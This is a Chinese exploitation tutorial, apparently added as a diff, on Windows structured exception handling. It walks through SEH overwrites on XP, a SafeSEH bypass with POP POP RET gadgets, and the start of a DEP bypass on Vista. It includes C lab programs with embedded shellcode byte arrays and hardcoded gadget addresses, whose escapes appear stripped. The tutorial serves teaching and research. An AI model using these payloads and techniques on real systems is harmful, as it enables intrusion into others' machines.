@@ -1,0 +1,1373 @@
+# Windows下漏洞利用——S.E.H深入分析
+
+阅读量 **809965**
+
+|![](https://p0.ssl.qhimg.com/sdm/30_30_100/t01f942715e2a0f1a23.png)
+
+发布时间 : 2019-10-23 10:30:56
+
+ **x**
+
+##### 译文声明
+
+本文是翻译文章
+
+译文仅供参考，具体内容表达以及含义原文为准。
+
+![](https://p0.ssl.qhimg.com/t01b0a62e7f6aeaf4d7.jpg)
+
+## 引言
+
+程序异常处理机制，简称S.E.H. 是Windwos下缓冲区溢出漏洞的一大特色，也是绕过StackCookie的一大杀器，在当年微软WinXP
+SP2更新包中紧急推出SafeSEH足以见其威力。作为很多Windows exploit利用的基础技术，SEH的研究对于Win下漏洞研究有着举足轻重的作用。
+
+本文将从最基础的SEH覆盖，到SafeSEH保护机制的绕过，再到最后绕过SafeSEH结合DEP等保护机制，对SEH的利用进行由浅入深的的研究。
+
+## 第一章 S.E.H结构分析
+
+在我们开始调试SEH结构之前，需要做好一些准备工作。
+
+###  1.1 环境配置
+
+本次实验的主要环境是Windows XP /Windows Vista
+
+编译工具为VC++6.0/VS 2010
+
+两个系统下都支持/SafeSEH选项，但是WinXp下没有开启全局DEP和SafeSEH，大部分模块都没有开启保护，所以研究漏洞更容易，我们会从XP入手，最后尝试在Vista下也实现漏洞利用。
+
+**1.1.1调试工具**
+
+安装Windbg/ImmunityDebugger作为调试工具
+
+Windbg是Windows 的经典调试工具，采用命令行操作，功能十分强大，甚至可以调试Windows内核，目前也已经支持Mona插件。
+
+ImmunityDebugger操作非常友好，只需要知道几个快捷键就能调试程序，因为是由python编写，相比OD对于python扩展更加友好，原生支持Mona插件。
+
+Windbg加载符号表
+
+    
+    
+    0:040> .sympath SRV*c:Symbols*http://msdl.microsoft.com/download/symbols 0:040> .reload
+    
+
+如果是Windows XP因为微软已经放弃了支持，只能在网络上找别人下好的符号表安装。
+
+![](https://s2.ax1x.com/2019/10/18/KZqbJx.png)
+
+**1.1.2 Mona插件**
+
+Mona插件是一个非常强大的插件，能大大加快漏洞利用程序的编写速度，特别是其中ROP字段的检索简直是WIN下漏洞利用的福音。
+
+我们可以在github上下载[mona](https://github.com/corelan/mona)
+
+Immunity Debugger下安装
+
+官方描述的安装方法
+
+> drop mona.py into the ‘PyCommands’ folder (inside the Immunity Debugger
+> application folder).
+>
+> install Python 2.7.14 (or a higher 2.7.xx version) into c:python27, thus
+> overwriting the version that was bundled with Immunity. This is needed to
+> avoid TLS issues when trying to update mona.
+
+将下载好的mona.py放进 PyCommands目录
+
+将Python2.7.14（或更高版本的2.7.xx）安装到c:python27中，从而覆盖Immunity Debugger 与绑定的版本（python
+2.5）。在尝试更新mona时，需要避免tls问题。
+
+WinDBG下安装
+
+需要下载mona.py、windbglib.py 和pykd
+
+可以参考[https://github.com/corelan/windbglib上面的安装方法。](https://github.com/corelan/windbglib%E4%B8%8A%E9%9D%A2%E7%9A%84%E5%AE%89%E8%A3%85%E6%96%B9%E6%B3%95%E3%80%82)
+
+原文引用:
+
+> Windows 7 or 10, 64bit
+>
+> Download pykd.zip from
+> <https://github.com/corelan/windbglib/raw/master/pykd/pykd.zip> and save it
+> to a temporary location on your computer
+>
+> Check the properties of the file and “Unblock” the file if necessary.
+>
+> Extract the archive. You should get 2 files: pykd.pyd and vcredist_x86.exe
+>
+> Run vcredist_x86.exe with administrator privileges and accept the default
+> values.
+>
+> Copy pykd.pyd to C:Program Files (x86)Windows Kits8.0Debuggersx86winext or
+> C:Program Files (x86)Windows Kits10Debuggersx86winext
+>
+> Open a command prompt with administrator privileges and run the following
+> commands:
+
+1.寻找代码碎片
+
+命令 !py mona findwild -s “执行” -m 模块名
+
+例如`!py mona findwild -s "pop r32"` #寻找pop 任意寄存器 的gadget
+
+2.打印模块信息
+
+`!py mona module`
+
+可以查看加载各个模块开启的安全机制
+
+###  1.2 S.E.H分析
+
+**1.2.1 结构化异常处理机制SEH**
+
+S.E.H的全名为异常处理结构体(Structure Exception
+Handler)是Windows特有的一种异常机制。每一个S.E.H包含两个DWORD指针：Next S.E.H Recoder（后文简称next
+recoder）和Exception Handler（后文简称SE handler）
+
+S.E.H需要通过try/catch之类的异常处理函数生成，同时S.E.H结构是存放在栈中的（仅32位环境），这也给Win程序的安全留下的隐患。
+
+**1.2.2静态分析**
+
+程序主要由_try{}_catch{}结构构成，在SEH_test()函数中生成一个S.E.H链。
+
+通过除零来产生异常，触发S.E.H结构处理。
+
+案例源码如下
+
+    
+    
+    //SEH.cpp
+    
+    #include "stdafx.h"
+    
+    #include<stdio.h>;
+    
+    #include<windows.h>
+    
+    
+    
+    char shellcode[]="x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90";
+    
+    
+    
+    void MyExceptionhandler()
+    
+    {
+    
+        printf("got an exception ,press Enter to kill the process!n");
+    
+        getchar();
+    
+        ExitProcess(1);
+    
+    }
+    
+    
+    
+    void SEH_test()
+    
+    {
+    
+        int zero=0;
+    
+        char buf[200];
+    
+        __asm int 0x3;
+    
+        __try{
+    
+            printf("In the SEH_test!n");
+    
+            strcpy(buf,shellcode);
+    
+            zero=4/zero;
+    
+        }
+    
+        __except(MyExceptionhandler()){};
+    
+    }
+    
+    
+    
+    int main(int argc, char* argv[])
+    
+    {
+    
+        SEH_test();
+    
+    
+    
+        return 0;
+    
+    }
+    
+
+使用IDA分析生成的HEX程序
+
+注：这里的关键的几个函数，在IDA中我将名字修改成了与源码中的函数名同步，需要注意的是IDA的逆向是无法恢复原函数名的。
+
+![](https://s2.ax1x.com/2019/10/18/KZqyon.png)
+
+主函数和源码相同，只有一个跳转到SEH_test函数操作。
+
+![](https://s2.ax1x.com/2019/10/18/KZqsds.png)
+
+![](https://s2.ax1x.com/2019/10/18/KZqrZj.png)
+
+**1.2.3 S.E.H结构入栈分析**
+
+通过 **push offset __except_handler3** 将处理结构异常函数的地址入栈
+
+**通过** **mov eax, large fs:0** 将上一个S.E.H链的地址入栈
+
+最后将自己的S.E.H链接放入fs:[0]作为链首。
+
+    
+    
+    .text:004010F0 ; __unwind { // __except_handler3
+    
+    .text:004010F0                 push    ebp
+    
+    .text:004010F1                 mov     ebp, esp
+    
+    .text:004010F3                 push    0FFFFFFFFh
+    
+    .text:004010F5                 push    offset stru_423060
+    
+    **.text:004010FA                push    offset __except_handler3** **//SE handler入栈**
+    
+    **.text:004010FF                 mov     eax, large fs:0** **//将上一个S.E.H链入栈**
+    
+    **.text:00401105                 push    eax**
+    
+    .text:00401106                 mov     large fs:0, esp //将这个S.E.H链头放入fs:[0]，作为S.E.H链表的链首
+    
+    .text:0040110D                 add     esp, 0FFFFFEECh
+    
+    .text:00401113                 push    ebx
+    
+    .text:00401114                 push    esi
+    
+    .text:00401115                 push    edi
+    
+    .text:00401116                 mov     [ebp+ms_exc.old_esp], esp
+    
+    .text:00401119                 lea     edi, [ebp+var_124]
+    
+    .text:0040111F                 mov     ecx, 43h
+    
+    .text:00401124                 mov     eax, 0CCCCCCCCh
+    
+    .text:00401129                 rep stosd
+    
+    .text:0040112B                 mov     [ebp+var_1C], 0
+    
+    .text:00401132                 int     3               ; Trap to Debugger
+    
+    .text:00401133 ;   __try { // __except at loc_401176
+    
+    .text:00401133                 mov     [ebp+ms_exc.registration.TryLevel], 0
+    
+    .text:0040113A                 push    offset aInTheSehTest ; "In the SEH_test!n"
+    
+    .text:0040113F                 call    _printf
+    
+    .text:00401144                 add     esp, 4
+    
+    .text:00401147                 push    offset byte_428310 ; char *
+    
+    .text:0040114C                 lea     eax, [ebp+var_E4]
+    
+    .text:00401152                 push    eax             ; char *
+    
+    .text:00401153                 call    _strcpy
+    
+    .text:00401158                 add     esp, 8
+    
+    .text:0040115B                 mov     eax, 4
+    
+    .text:00401160                 cdq
+    
+    .text:00401161                 idiv    [ebp+var_1C]
+    
+    .text:00401164                 mov     [ebp+var_1C], eax
+    
+    .text:00401164 ;   } // starts at 401133
+    
+    .text:00401167                 mov     [ebp+ms_exc.registration.TryLevel], 0FFFFFFFFh
+    
+    .text:0040116E                 jmp     short loc_401180
+    
+    .text:00401170 ; ---------------------------------------------------------------------------    
+    .text:00401170
+    
+    .text:00401170 loc_401170:                             ; DATA XREF: .rdata:stru_423060↓o
+    
+    .text:00401170 ;   __except filter // owned by 401133
+    
+    .text:00401170                 call    j_MyExceptionhandler
+    
+    .text:00401175 ; ---------------------------------------------------------------------------    
+    .text:00401175                 retn
+    
+
+在OD中查看S.E.H结构
+
+在INT 0x3断点，可以发现SEH链接的结构已经被OD添加了注释。
+
+![](https://s2.ax1x.com/2019/10/18/KZq2WV.png)
+
+Next指针存放在0x12FF1C，指向0x12FFB0地址空间。
+
+Handler句柄则指向0x4016B0
+
+![](https://s2.ax1x.com/2019/10/18/KZqciq.png)
+
+**1.2.4 S.E.H handler结构分析**
+
+SE handler的结构体名为EXCEPTION_DISPOSITION
+
+MSDN描述的结构如下
+
+    
+    
+    EXCEPTION_DISPOSITION
+    
+    __cdecl _except_handler(
+    
+            struct _EXCEPTION_RECORD *ExceptionRecord,
+    
+            void * EstablisherFrame,
+    
+            struct _CONTEXT *ContextRecord,
+    
+            void * DispatcherContext
+    
+    );
+    
+
+* EstablisherFrame这个存放便是我们S.E.H结构中Next handler的地址。
+
+经过实际调试，我们发现。当程序发生异常，跳转到SE handler指向的地址
+
+EXCEPTION_DISPOSITION结构会入栈，顺序为 _DispatcherContext - >_ContextRecord ->
+_EstablisherFrame- >_ExceptionRecord
+
+所以当程序跳转进入S.E.H handler EstablisherFrame位于ESP+8的位置。
+
+程序将这个结构入栈的原因大概是方便在执行完 handler函数之后，如果程序依旧不能解决问题，会进入下一个S.E.H结构，所以会将Next
+Recrod的地址入栈帧。
+
+调试截图
+
+覆盖SE handler为0x41414141
+
+覆盖Next record为0x42424242
+
+![](https://s2.ax1x.com/2019/10/18/KZqgJ0.png)
+
+程序处理异常时，EIP跳转到了0x41414141（SE
+handler），而此时ESP+8的位置存储的0x17EE4C（EstablisherFrame）指针指向的数据正是0x42424242（Next
+record）
+
+![](https://s2.ax1x.com/2019/10/18/KZqRzT.png)
+
+![](https://s2.ax1x.com/2019/10/18/KZqfQU.png)
+
+通过调试，不难发现，这个特性同样容易让攻击者利用，一旦进入SE handler，调用POP POP
+RET，便能让程序跳转到EstablisherFrame指向的内容，也就是同样可控的Next Record地址。
+
+当然这点在绕过SafeSEH中才会用到，在之后的章节中会进行解析，详见第二章2.3节。
+
+## 第二章 S.E.H的利用
+
+###  2.1 Windows XP SP2之前的利用
+
+**2.1.1 S.E.H结构覆盖**
+
+首先，让我们重新观察这张S.E.H的简化图，有两个要点引起我们的注意。
+
+![](https://s2.ax1x.com/2019/10/18/KZqow9.png)
+
+首先S.E.H是在栈中的也就说有可能被我们写入的数据覆盖。其次Handler指向的是我们的异常处理函数，会造成EIP的跳转（虽然Handler并不直接指向我们的异常处理函数，而是经过多次跳转）。
+
+所以我们就有了最基础的思路—通过覆盖SE handler，然后触发异常（除0），使得程序跳转到我们的shellcode，和经典栈溢出如出一辙，岂不美哉。
+
+**2.1.2测试案例**
+
+在OD中在View中可以直接查看S.E.H
+chains（S.E.H链），可以看到我们的程序的S.E.H链存在三个结点。我们要覆盖的是位于0x12ff1c的S.E.H结构。
+
+![](https://s2.ax1x.com/2019/10/18/KZqXQO.png)
+
+生成pattern用例
+
+0xD8*”A”+EIP
+
+![](https://s2.ax1x.com/2019/10/18/KZqToR.png)
+
+从buf首地址到S.E.H结构中间存在0xD4（212）字节的空间，将我们的shellcode地址设置在212字节中，多余的空间用0x90填充。我们的目标是覆盖SE
+handler（距离首地址0xD8个字节）为我们的shellcode地址/buf的首地址。
+
+调试方面的问题
+
+覆盖S.E.H成功。通过OD的S.E.H链查看器发现链已经成功被覆盖为了Shellocde的首地址。
+
+![](https://s2.ax1x.com/2019/10/18/KZqhyF.png)
+
+程序调试卡在IDIV处。提示整数除以0异常，使用Shift+F9继续运行。（当然啦，可以在Debug Options中选择忽略这个异常，OD就不会中断了）
+
+![](https://s2.ax1x.com/2019/10/18/KZqqW6.png)
+
+![](https://s2.ax1x.com/2019/10/18/KZqHF1.png)
+
+但是覆盖SE handler为栈地址，提示应用程序无法处理异常。无论怎么调试都无法成功。
+
+![](https://s2.ax1x.com/2019/10/18/KZqOSK.png)
+
+后来发现覆盖0x41414141甚至都可以成功让EIP跳转，但是偏偏栈地址不行。Windows
+SP0应该是没有开启SafeSEH的，所以这里是这次实验的一个疑点。一般来说，Shellocde已经被执行了。
+
+甚至可以修改覆盖Handler使得程序跳转到printf函数，重新输出一次In the SEH_test!
+
+案例代码如下
+
+    
+    
+    #include "stdafx.h"
+    
+    #include<stdio.h>
+    
+    #include<windows.h>
+    
+    
+    
+    char shellcode[]=
+    
+    "x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90"
+    
+    "x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90"
+    
+    "x90x90x90x90"
+    
+    "xFCx68x6Ax0Ax38x1Ex68x63x89xD1x4Fx68x32x74x91x0C"
+    
+    "x8BxF4x8Dx7ExF4x33xDBxB7x04x2BxE3x66xBBx33x32x53"
+    
+    "x68x75x73x65x72x54x33xD2x64x8Bx5Ax30x8Bx4Bx0Cx8B"
+    
+    "x49x1Cx8Bx09x8Bx69x08xADx3Dx6Ax0Ax38x1Ex75x05x95"
+    
+    "xFFx57xF8x95x60x8Bx45x3Cx8Bx4Cx05x78x03xCDx8Bx59"
+    
+    "x20x03xDDx33xFFx47x8Bx34xBBx03xF5x99x0FxBEx06x3A"
+    
+    "xC4x74x08xC1xCAx07x03xD0x46xEBxF1x3Bx54x24x1Cx75"
+    
+    "xE4x8Bx59x24x03xDDx66x8Bx3Cx7Bx8Bx59x1Cx03xDDx03"
+    
+    "x2CxBBx95x5FxABx57x61x3Dx6Ax0Ax38x1Ex75xA9x33xDB"
+    
+    "x53x68x61x69x6Ex65x68x6Dx69x67x72x8BxC4x53x50x50"
+    
+    "x53xFFx57xFCx53xFFx57xF8x90x90x90x90x90x90x90x90"
+    
+    "x3Cx11x40x00"; //跳转到0x40113C
+    
+    
+    
+    void MyExceptionhandler()
+    
+    {
+    
+    ​    printf("got an exception ,press Enter to kill the process!n");
+    
+    ​    getchar();
+    
+    ​    ExitProcess(1);
+    
+    }
+    
+    
+    
+    void SEH_test()
+    
+    {
+    
+    ​    char buf[200];
+    
+    ​    int zero=0;
+    
+    ​    
+    
+    ​    //__asm int 0x3;
+    
+    ​    __try{
+    
+    ​        printf("In the S.E.H_test!n");
+    
+    ​        strcpy(buf,shellcode);
+    
+    ​        zero=4/zero;
+    
+    ​    }
+    
+    ​    __except(MyExceptionhandler()){};
+    
+    }
+    
+    
+    
+    int main(int argc, char* argv[])
+    
+    {
+    
+    ​    S.E.H_test();
+    
+    
+    
+    ​    return 0;
+    
+    }
+    
+
+![](https://s2.ax1x.com/2019/10/18/KZqjyD.png)
+
+在这里提供一种思路—使用“JMP/CALL寄存器”跳转
+
+如何寻找指令碎片
+
+在OD调试界面右键-选择模块-kernel32，右键-搜索所有指令（Ctrl+F）
+
+因为我们的编写的程序体量比较小，很多代码碎片都搜索不到。所以我们直接在kernel32中找，因为WinXP下并没有开启ASLR，所以kernel的基地址是不会变化的。
+
+![](https://s2.ax1x.com/2019/10/18/KZqvOe.png)
+
+重新布置Shellcode，— 一种错误的布置
+
+将CALL EBP指令布置在SE handler，将shellcode布置在SE
+handler+8的位置，因为EBP正好指向这个位置。所以如果触发异常，程序就会执行CALL EBP，使得程序跳转执行shellcode。
+
+用例pattern为`0xD8*”x90”+Call_esp+8*”x90”+shellcode`
+
+这种情况，没有考虑在触发SEH时候，栈帧也会变化，导致失效。
+
+虽然我们没有成功执行shellcode，不过我们还是可以通过覆盖SE handler成功修改程序执行流程。
+
+经过上面的调试，我们已经知道了覆盖SE
+handler使得程序跳转的思路。并且知道了上古windows下是如何利用S.E.H覆盖的。虽然没有成功执行shellcode，不过成功使得程序的流程做出了改变。
+
+（至于具体原因，可能是我的Windows XP版本的问题，虽然没有写是SP几的版本，但是在2019年要找到一个纯净版的windows xp的确非常困难）
+
+到目前，这种S.E.H的利用方法，在目前的系统中已经失效了。
+
+在WindowsXP SP2中引入了SafeSEH，对传统的S.E.H覆盖进行了检查，导致这种利用手法的失效。
+
+**2.2 Windows XP SP2后的SEH [SafeSEH]**
+
+SafeSEH，也就是俗称的软件DEP。是微软在Windows XP
+SP2引入的一个S.E.H校验机制。其原理非常好理解。就是对S.E.H行为做检测，主要有如下两个检测
+
+（1）检查异常处理链是否位于当前程序中，如果不在当前栈中，程序将中止异常处理函数的调用。
+
+（2）检查异常处理函数指针是否指向当前程序的栈中。
+
+尤其是第二个检测，几乎就是针对我们覆盖SE handler跳转到栈中shellcode的这种利用手法。不过绕过方式也有很多种，会在下文进行介绍。
+
+SafeSEH可以通过/SafeSEH链接选项，让程序具有SafeSEH功能。
+
+VS中 项目-属性-链接器-命令行 输入/SafeSEH即可
+
+![](https://s2.ax1x.com/2019/10/18/KZqzeH.png)
+
+问：如何判断一个程序开启SafeSEH
+
+答：可以使用VS自带的工具dumpbin，在Visual Stdio 2010-Visual Studio Tools-Visual
+Stdio兼容工具命令中运行
+
+![](https://s2.ax1x.com/2019/10/18/KZLSwd.png)
+
+使用dumpbin /loadconfig 文件路径/文件名 就可以获取PE文件当前是否开启S.E.H
+
+当然这个程序让我想起了Linux下玩PWN经常用的工具 objdump和readelf，功能非常类似，需要的只是时间去适应。
+
+当然还有更简单的方法，使用mona插件的modules功能，可以非常快捷地查询软件加载的各个分别开启了哪些保护，就像gdb的peda插件一样方便。（注：下图与本次实验无关）
+
+执行`!py mona modules`
+
+![](https://s2.ax1x.com/2019/10/18/KZLpTA.png)
+
+SafeSEH未开启的情况
+
+使用dumpbin分析，没有提示存在SafeSEH链接
+
+![](https://s2.ax1x.com/2019/10/18/KZLifP.png)
+
+添加了 /SafeSEH 选项之后编译的文件
+
+![](https://s2.ax1x.com/2019/10/18/KZLkSf.png)
+
+SafeSEH最终的行为是防止栈执行，所以被称为是软件DEP，但是没有硬件DEP，shellcode还是又可能被执行。
+
+所以在最后一个实验，我们会将硬件DEP也开启，SafeSEH结合DEP，也会大大提高利用难度。我们将会学习使用ROP来绕过软件和硬件的DEP。
+
+当然首先要学习的是如何绕过SafeSEH。
+
+###  2.3 SafeSEH的绕过（基础）
+
+**2.3.1 SafeSEH绕过原理浅析**
+
+通过覆盖NEXT指针和SE handler，使用未开启SafeSEH模块的Gadgets绕过SafeSEH。
+
+PS：因为WindowsXP的kernel模块并没有开启SafeSEH，所以我们可以直接利用Kernel里的gadget
+
+我们需要寻找Gadget的格式为
+
+    
+    
+    POP Reg32
+    
+    POP Reg32
+    
+    RET
+    
+
+我们要覆盖SE handler使得程序执行这段gadget，最终跳转到shellcode。
+
+**2.3.1向后跳转0x6字节的方案**
+
+如下布置栈帧，注意JMP SHORT 0x6是通过机器码EB 06 90 90（90为NOPs不影响程序执行）实现。
+
+    
+    
+    Before OverFlow[        ][ NEXT RECORD ][ SE Handler  ][ ]
+    
+    After OverFlow  [  Nop’s ][ JMP SHORT 0x6 ][POP POP RET][ SHELLCODE ]
+    
+
+覆盖SE handler指向一段POP POP RET的Gadgets，当发生程序错误，调用S.E.H会让程序跳转到POP POP
+RET指令的位置，当执行到RET的时候，会发现此时ESP正好指向JMP SHORT
+0x6，程序执行这个代码，使得EIP向后调转0x6个字节，跳入我们埋在缓冲区后方的shellcode，成功执行代码。
+
+> 问：那么POP POP RET是如何发挥作用的？
+>
+> 答：在《Exploit编写教程》中这样描述—
+>
+> 在于S.E.H的Exploit中pop pop ret指令串到底是如何起作用的? 当异常发生时，异常分发器创建自己的栈帧。它会把EH
+> Handler成员压入新创的栈帧中(作为函数起始的一部分)在EH结构中有一个域是EstablisherFrame。
+>
+> 这个域指向异常注册记录 (next SEH)的地址并被压入栈中，当一个例程被调用的时候被压入的这个值都是位于 ESP+8的地方。
+>
+> 现在如果我们用pop pop ret串的地址覆盖SE Handler: -第一个pop将弹出栈顶的4 bytes
+> -接下来的pop继续从栈中弹出4bytes -最后的ret将把此时ESP所指栈顶中的值(next SEH的地址)放到EIP中。
+>
+> 事实上，next SEH域可以认为是shellcode的第一部分。
+
+在后文中也会给出调试的过程和结果，读者还可以结合下面[这篇文章](https://blog.csdn.net/swartz_lubel/article/details/77921893)理解消化。
+
+如果还没有理解，可以回到第一章，去看一下S.E.H分析中关于EXCEPTION_DISPOSITION
+
+结构的介绍，相信你一定会有收获。
+
+**2.3.2 绕过SafeSEH实战**
+
+编译环境
+
+WINDOWS XP HOME Editon VC++6.0
+
+寻找Gadget
+
+可以通过Mona插件查找格式为POP POP RET格式的代码片段。//前文已经介绍
+
+但是通过ImmunityDebbger自身的搜索功能也是可以完成搜索的。右击代码段-搜索全部模块的命令序列 就可以进行搜索。输入 POP 某个寄存器名
+RET即可找到很多匹配的字符串，寻找一个符合条件的。（没有0x00字节，没有操作敏感寄存器等）
+
+我们找到Kernel32.DLL模块中的一段代码，地址为0x77F54F7B，WINXP没有ASLR的情况下，Kernel的基地址不发生变化，所以直接硬编码就可以用了。
+
+![](https://s2.ax1x.com/2019/10/18/KZLCFI.png)
+
+调试程序
+
+F9运行程序，程序停留在DIV指令处。调试器因为发现除0错误，所以自己断下了。
+
+此时如果运行Shirft+F9（如果要看具体细节将F9换成F7/8），就可以继续运行.
+
+此时我们发现程序跳转到了0x77F54F7B处了。
+
+![](https://s2.ax1x.com/2019/10/18/KZLPYt.png)
+
+此时的栈地址和我们之前填充的栈的距离已经很远了，但是观察此时的ESP+8的位置（0x12FA40），发现这个位置上居然指向0x12FF1C，也就是我们的NEXT
+RECORD的地址。
+
+各位读者都知道，我们的NEXT RECORD存放的字节码为EB 06 90 90。也就是JMP SHORT 0x6.
+（调试器将其翻译为跳转到0x12FF24，但是实际上JMP SHORT是相对跳转，而不是绝对地址跳转）
+
+![](https://s2.ax1x.com/2019/10/18/KZLVOg.png)
+
+此时执行POP POP RET，程序就成功跳转到了JMP SHORT
+0x6，然后再次跳转，进入了我们的SHELLCODE，成功弹出了Migraine专属的弹窗。
+
+![](https://s2.ax1x.com/2019/10/18/KZLE6S.png)
+
+源码如下，主要参考的是《0Day漏洞分析》的SafeSEH一章。
+
+编译环境
+
+WINDOWS XP HOME Editon VC++6.0
+
+    
+    
+    #include "stdafx.h"
+    
+    #include<stdio.h>
+    
+    #include<windows.h>
+    
+    
+    
+    char shellcode[]=
+    
+    "x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90"
+    
+    "x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90"
+    
+    "x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90"
+    
+    "x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90"
+    
+    "x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90"
+    
+    "x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90"
+    
+    "x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90"
+    
+    "x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90"
+    
+    "x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90"
+    
+    "x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90"
+    
+    "x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90"
+    
+    "x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90"
+    
+    "x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90"
+    
+    "xEBx06x90x90"  // Point to Next SEH record
+    
+    "x7Bx4FxF5x77" //SE handler
+    
+    //"x70xfex12x00"//SE handler
+    
+    "xFCx68x6Ax0Ax38x1Ex68x63x89xD1x4Fx68x32x74x91x0C"
+    
+    "x8BxF4x8Dx7ExF4x33xDBxB7x04x2BxE3x66xBBx33x32x53"
+    
+    "x68x75x73x65x72x54x33xD2x64x8Bx5Ax30x8Bx4Bx0Cx8B"
+    
+    "x49x1Cx8Bx09x8Bx69x08xADx3Dx6Ax0Ax38x1Ex75x05x95"
+    
+    "xFFx57xF8x95x60x8Bx45x3Cx8Bx4Cx05x78x03xCDx8Bx59"
+    
+    "x20x03xDDx33xFFx47x8Bx34xBBx03xF5x99x0FxBEx06x3A"
+    
+    "xC4x74x08xC1xCAx07x03xD0x46xEBxF1x3Bx54x24x1Cx75"
+    
+    "xE4x8Bx59x24x03xDDx66x8Bx3Cx7Bx8Bx59x1Cx03xDDx03"
+    
+    "x2CxBBx95x5FxABx57x61x3Dx6Ax0Ax38x1Ex75xA9x33xDB"
+    
+    "x53x68x61x69x6Ex65x68x6Dx69x67x72x8BxC4x53x50x50"
+    
+    "x53xFFx57xFCx53xFFx57xF8";
+    
+    
+    
+    void MyExceptionhandler()
+    
+    {
+    
+    ​    printf("got an exception ,press Enter to kill the process!n");
+    
+    ​    getchar();
+    
+    ​    ExitProcess(1);
+    
+    }
+    
+    
+    
+    void SEH_test()
+    
+    {
+    
+    ​    char buf[200];
+    
+    ​    int zero=0;
+    
+    ​    
+    
+    ​    //__asm int 0x3;
+    
+    ​    __try{
+    
+    ​        printf("In the SEH_test!n");
+    
+    ​        strcpy(buf,shellcode);
+    
+    ​        zero=4/zero;
+    
+    ​    }
+    
+    ​    __except(MyExceptionhandler()){};
+    
+    }
+    
+    
+    
+    int main(int argc, char* argv[])
+    
+    {
+    
+    ​    SEH_test();
+    
+    
+    
+    ​    return 0;
+    
+    }
+    
+
+希望能构建更短的payload，尝试向前跳转方案（思路）
+
+    
+    
+    #include "stdafx.h"
+    
+    #include<stdio.h>
+    
+    #include<windows.h>
+    
+    
+    
+    char shellcode[]=
+    
+    "x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90"
+    
+    "x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90"
+    
+    "x90x90x90x90"
+    
+    "xFCx68x6Ax0Ax38x1Ex68x63x89xD1x4Fx68x32x74x91x0C"
+    
+    "x8BxF4x8Dx7ExF4x33xDBxB7x04x2BxE3x66xBBx33x32x53"
+    
+    "x68x75x73x65x72x54x33xD2x64x8Bx5Ax30x8Bx4Bx0Cx8B"
+    
+    "x49x1Cx8Bx09x8Bx69x08xADx3Dx6Ax0Ax38x1Ex75x05x95"
+    
+    "xFFx57xF8x95x60x8Bx45x3Cx8Bx4Cx05x78x03xCDx8Bx59"
+    
+    "x20x03xDDx33xFFx47x8Bx34xBBx03xF5x99x0FxBEx06x3A"
+    
+    "xC4x74x08xC1xCAx07x03xD0x46xEBxF1x3Bx54x24x1Cx75"
+    
+    "xE4x8Bx59x24x03xDDx66x8Bx3Cx7Bx8Bx59x1Cx03xDDx03"
+    
+    "x2CxBBx95x5FxABx57x61x3Dx6Ax0Ax38x1Ex75xA9x33xDB"
+    
+    "x53x68x61x69x6Ex65x68x6Dx69x67x72x8BxC4x53x50x50"
+    
+    "x53xFFx57xFCx53xFFx57xF8x90x90x90x90"
+    
+    "xE9x4FxFFxFF"  // Point to Next SEH record
+    
+    "x7Bx4FxF5x77"; //SE handler
+    
+    
+    
+    void MyExceptionhandler()
+    
+    {
+    
+    ​    printf("got an exception ,press Enter to kill the process!n");
+    
+    ​    getchar();
+    
+    ​    ExitProcess(1);
+    
+    }
+    
+    
+    
+    void SEH_test()
+    
+    {
+    
+    ​    char buf[200];
+    
+    ​    int zero=0;
+    
+    ​    
+    
+    ​    //__asm int 0x3;
+    
+    ​    __try{
+    
+    ​        printf("In the SEH_test!n");
+    
+    ​        strcpy(buf,shellcode);
+    
+    ​        zero=4/zero;
+    
+    ​    }
+    
+    ​    __except(MyExceptionhandler()){};
+    
+    }
+    
+    
+    
+    int main(int argc, char* argv[])
+    
+    {
+    
+    ​    SEH_test();
+    
+    
+    
+    ​    return 0;
+    
+    }
+    
+
+这个方案的局限性。如果SHELLCODE长度过长，就会发生这段代码现在的状况。
+
+从12FF1C向前跳转到12FE70距离大于了JMP
+SHORT到最大距离128字节。所以我们无法进行短跳转，如果使用唱跳转需要多一个字节的空间，也就需要从NEXT RECORD多一个字节，覆盖到SE
+handler的空间。如下图所示。
+
+![](https://s2.ax1x.com/2019/10/18/KZLAl8.png)
+
+当然，如果对shellcode进行精心设计，让向前跳转，从shellcode的某个位置跳转到shellcode的头部进行执行。但是这样，Exploit的稳定性就未知了。所以还是建议选择向后跳转，除非shellcode长度非常短。
+
+###  2.4绕过重重保护实现的SEH利用
+
+在开启全面硬件 DEP的Windows Vista下绕过SafeSEH
+
+编译环境
+
+WINDOWS VISTA（使用x64系统不影响实验，只要编译的PE文件是x86的即可）
+
+VS2010
+
+**2.4.1安全选项设置**
+
+Windows Vista关闭ASLR
+
+虽然绕过ASLR也是一个很有趣的过程，不过从前文的S.E.H和SafeSEH直接到DEP和ASLR的双重加持，跨度未免太大，所以决定暂时降低一些难度。
+
+修改注册表的方式关闭比较麻烦，所以可以在VS编译的时候将“配置属性-链接器-高级-随机基址”的值修改为否即可
+
+开启硬件DEP
+
+和ASLR一样，在链接器中打开数据执行保护DEP。
+
+开启GS保护
+
+预防经典栈溢出的Stack Cookie
+
+![](https://s2.ax1x.com/2019/10/18/KZLemQ.png)
+
+Windows Vista系统为系统模块全面开启了SafeSEH和DEP
+
+全面开启SafeSEH可以防止程序跳转到开启SafeSEH到模块，也就是说我们无法通过控制SE
+handler来跳转到任何开启SafeSEH的模块。导致我们无法使用kernel32.dll模块的pop pop ret实现绕过SafeSEH。在Win
+XP下还可以使用kernel下到代码段进行ROP，但是Windows Vista让利用系统Dll进行ROP失去了可能性。
+
+而DEP的开启，则是当我们通过pop pop ret直接跳转执行shellcode的时候，让栈内的shellcode无法执行。
+
